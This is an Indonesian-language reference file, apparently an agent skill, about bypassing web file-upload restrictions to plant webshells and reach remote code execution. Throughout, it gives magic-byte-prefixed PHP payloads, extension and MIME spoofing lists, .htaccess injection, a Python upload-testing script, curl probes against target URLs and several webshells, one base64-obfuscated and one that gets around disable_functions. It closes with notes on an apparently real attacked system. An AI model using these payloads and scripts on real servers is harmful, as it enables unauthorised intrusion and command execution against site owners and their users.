---
name: file-upload-bypass
description: "Teknik bypass file upload restriction — magic bytes, double extension, MIME spoofing, client-side bypass, .htaccess injection. Gunakan untuk melewati validasi upload dan achieve webshell/RCE."
---

# File Upload Bypass Reference

## 1. LAYER VALIDASI YANG ADA (dan cara bypassnya)

```
Layer 1: Client-side (JavaScript) → bypassable
Layer 2: Content-Type / MIME header → bypassable (kita kontrol)
Layer 3: Magic bytes (file signature) → bypassable (tambahkan di awal)
Layer 4: Extension check (server-side) → perlu test berbagai variasi
Layer 5: Storage location (webroot vs non-webroot) → tentukan apakah execute bisa
Layer 6: Serve mechanism (include vs readfile) → tentukan eksekusi PHP
```

---

## 2. CLIENT-SIDE BYPASS

### JavaScript `accept` attribute
```javascript
// Di browser console — hapus accept filter
document.querySelector('input[type="file"]').removeAttribute('accept')

// Hapus onchange validation
document.querySelector('input[type="file"]').removeAttribute('onchange')

// Atau langsung submit form bypass
document.getElementById('upload_form').submit()
```

### JavaScript extension check bypass pattern
```javascript
// Pola umum yang rentan (hanya cek ekstensi terakhir):
const extension = fileName.split('.').pop();  // → hanya ambil ekstensi terakhir
// Bypass: shell.php.pdf → extension = "pdf" → LOLOS
// Tapi shell.pdf.php → extension = "php" → BLOCKED

// Jika cek indexOf:
if (fileName.indexOf('.php') !== -1) → harus rename ke sesuatu tanpa .php
```

---

## 3. MAGIC BYTES BYPASS

Tambahkan signature file legitimate di awal untuk bypass file type check:

```python
# PDF magic bytes
content = b'%PDF-1.4\n<?php system($_GET["c"]); ?>\n%%EOF'

# JPEG magic bytes
content = b'\xFF\xD8\xFF\xE0' + b'<?php system($_GET["c"]); ?>'

# PNG magic bytes
content = b'\x89PNG\r\n\x1a\n<?php system($_GET["c"]); ?>'

# GIF magic bytes (paling kompatibel)
content = b'GIF89a<?php system($_GET["c"]); ?>'

# ZIP magic bytes
content = b'PK\x03\x04<?php system($_GET["c"]); ?>'
```

---

## 4. EXTENSION BYPASS

### Double extension (Apache behavior)
```
# Apache dengan AddHandler (vulnerable):
shell.php.pdf    → Apache execute sebagai PHP (ada .php di extension list)
shell.pdf.php    → Apache execute sebagai PHP (last extension = .php)

# Apache dengan SetHandler / FilesMatch (aman):
shell.php.pdf    → serve sebagai PDF (last ext = .pdf)
shell.pdf.php    → execute sebagai PHP (last ext = .php)

# Kesimpulan:
# shell.pdf.php  → BERBAHAYA di semua konfigurasi Apache
# shell.php.pdf  → berbahaya HANYA jika Apache misconfigured (AddHandler)
```

### Extension variations
```
# Case bypass
shell.pHp
shell.PHP
shell.PhP

# Ekstensi alternatif PHP
shell.php
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml    ← paling sering lolos
shell.phar
shell.shtml    ← SSI execution

# Null byte (legacy/PHP < 5.3)
shell.php%00.pdf
shell.php\x00.pdf

# Trailing characters
shell.php.
shell.php 
shell.php::$DATA   (Windows NTFS only)
```

### Upload test script
```python
import requests, io

shell = b'GIF89a<?php echo "PWNED_".phpversion()."|".system("id"); ?>'
exts = ['shell.php','shell.phtml','shell.php5','shell.phar',
        'shell.pdf.php','shell.php.pdf','shell.pHp','shell.PHP',
        'shell.shtml']

for name in exts:
    r = s.post(f"{BASE}/upload",
        files={"file": (name, io.BytesIO(shell), "image/jpeg")},
        allow_redirects=False)
    accepted = "ACCEPTED" if r.status_code in [200,302,303] else "REJECTED"
    print(f"  {name:<25} {r.status_code} {accepted}")
```

---

## 5. MIME TYPE BYPASS

```python
# Server cek Content-Type header saja → kita bisa set bebas
files = {"file": ("shell.php", io.BytesIO(content), "image/jpeg")}
files = {"file": ("shell.php", io.BytesIO(content), "image/png")}
files = {"file": ("shell.php", io.BytesIO(content), "application/pdf")}
files = {"file": ("shell.php", io.BytesIO(content), "application/octet-stream")}
files = {"file": ("shell.php", io.BytesIO(content), "text/plain")}
```

---

## 6. .HTACCESS UPLOAD BYPASS

Jika bisa upload .htaccess ke direktori web-accessible:

```apache
# .htaccess content untuk execute semua file sebagai PHP
AddType application/x-httpd-php .pdf .jpg .png .txt

# Atau AddHandler
AddHandler application/x-httpd-php .pdf

# Atau PHP engine on untuk semua
<Files *>
SetHandler application/x-httpd-php
</Files>
```

```python
# Upload .htaccess dengan magic bytes prefix
htaccess = b'GIF89a\nAddType application/x-httpd-php .pdf .jpg\n'
r = s.post(f"{BASE}/upload",
    files={"file": (".htaccess", io.BytesIO(htaccess), "image/jpeg")})
# Kemudian upload shell.pdf atau shell.jpg
```

---

## 7. MENENTUKAN APAKAH FILE BISA DIEKSEKUSI

### Cek serve mechanism
```
readfile($path)  → kirim raw bytes → PHP TIDAK execute
include($path)   → parse PHP → PHP EXECUTE → RCE!
file_get_contents + echo → raw bytes → tidak execute
require($path)   → parse PHP → EXECUTE

Cara cek: upload file dengan content unik, akses via URL, lihat output
- Jika output = "PWNED_8.x.x" → include/require → RCE
- Jika output = "<?php echo..." → readfile → tidak execute
```

### Cek apakah upload directory di webroot
```bash
# Coba akses langsung dengan nama file yang mungkin
curl http://target.com/uploads/shell.php?c=id
curl http://target.com/upload/shell.php?c=id
curl http://target.com/files/shell.php?c=id
curl http://target.com/assets/uploads/shell.php?c=id

# Jika file di-rename ke MD5, hitung MD5 konten file kita
import hashlib
md5 = hashlib.md5(file_content).hexdigest()
curl http://target.com/uploads/{md5}.php
```

---

## 8. BYPASS KETIKA FILE DI LUAR WEBROOT (readfile)

Jika file pasti di luar webroot dan pakai readfile → PHP tidak bisa execute langsung.
Opsi alternatif:

```
1. LFI → include uploaded file via path traversal
2. Log Poisoning → inject PHP ke access log → LFI include log file
3. ImageMagick (jika process image) → exploit via MVG/SVG payload
4. Ghostscript (jika process PDF) → exploit via PS injection
5. PHP unserialize → magic method __wakeup/__destruct
6. JWT path manipulation → jika path di JWT bisa dimanipulasi
```

---

## 9. WEBSHELL PAYLOADS

```php
// Minimal webshell
<?php system($_GET['c']); ?>

// Dengan error suppression
<?php @system($_GET['c']); ?>

// shell_exec (lebih reliable)
<?php echo shell_exec($_GET['c']); ?>

// eval (obfuscatable)
<?php eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw==')); ?>
// decoded: system($_GET['c']);

// Full featured
<?php
if(isset($_GET['c'])){
    echo "<pre>".shell_exec($_GET['c'])."</pre>";
} else {
    echo "ver=".phpversion()."|os=".PHP_OS."|cwd=".getcwd()."|user=".get_current_user();
}
?>

// Bypass disable_functions via proc_open
<?php
$cmd = $_GET['c'];
$proc = proc_open($cmd, [1=>['pipe','w'],2=>['pipe','w']], $pipes);
echo stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
proc_close($proc);
?>
```

---

## 10. CHECKLIST FILE UPLOAD BYPASS

1. ☐ Cek client-side validation → bypass via DevTools/Console
2. ☐ Cek MIME type → spoof Content-Type header
3. ☐ Cek magic bytes → tambahkan GIF89a / %PDF-1.4 di awal
4. ☐ Test semua variasi extension (php, phtml, phar, php5...)
5. ☐ Test double extension (shell.pdf.php, shell.php.pdf)
6. ☐ Test case variation (shell.pHp, shell.PHP)
7. ☐ Coba upload .htaccess jika blacklist-based
8. ☐ Tentukan serve mechanism (readfile vs include)
9. ☐ Cari path upload directory di webroot
10. ☐ Jika non-webroot → cari LFI atau secondary vector

## TEMUAN REAL (E-FILE Boyolali 2026)

Target: CI3 + Apache 2.4.41 Ubuntu, SafeLine WAF
- Server hanya cek magic bytes %PDF-1.4 di awal file
- SEMUA ekstensi diterima: .php, .phtml, .pdf.php, .php5, dll
- SEMUA MIME type diterima (image/jpeg, image/png, dll)
- File disimpan di LUAR webroot → readfile() → PHP tidak execute
- .htaccess ditolak (redirect ke root, bukan detail JWT)
- Konfigurasi Apache: upload dir non-webroot = mitigasi parsial
